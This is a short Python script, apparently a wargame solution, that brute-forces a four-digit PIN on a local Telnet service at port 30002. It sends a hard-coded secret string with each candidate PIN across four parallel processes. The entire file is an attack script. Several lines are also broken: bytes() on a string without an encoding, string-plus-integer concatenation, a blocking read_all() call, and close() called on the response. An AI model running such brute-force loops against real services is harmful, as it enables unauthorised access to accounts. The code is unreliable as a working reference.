from telnetlib import Telnet
from multiprocessing import Process

def brute(r1, r2):
    code = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
    with Telnet("127.0.0.1", 30002) as connection:
        for pin in range(r1, r2):
            connection.write(bytes(code + " " + str(pin).zfill(4)))
            response = connection.read_all()
            if 'Wrong' not in response:
                print ('[+] Successful -> ' + pin)
                print (response)
                response.close()
            else:
                if int(pin) % 100 == 0:
                    print('[!] Failed -> ' + pin)

if __name__ == '__main__':
    p1 = Process(target = brute, args = (0,2500,))
    p2 = Process(target = brute, args = (2500,5000,))
    p3 = Process(target = brute, args = (5000,7500,))
    p4 = Process(target = brute, args = (7500,10000,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()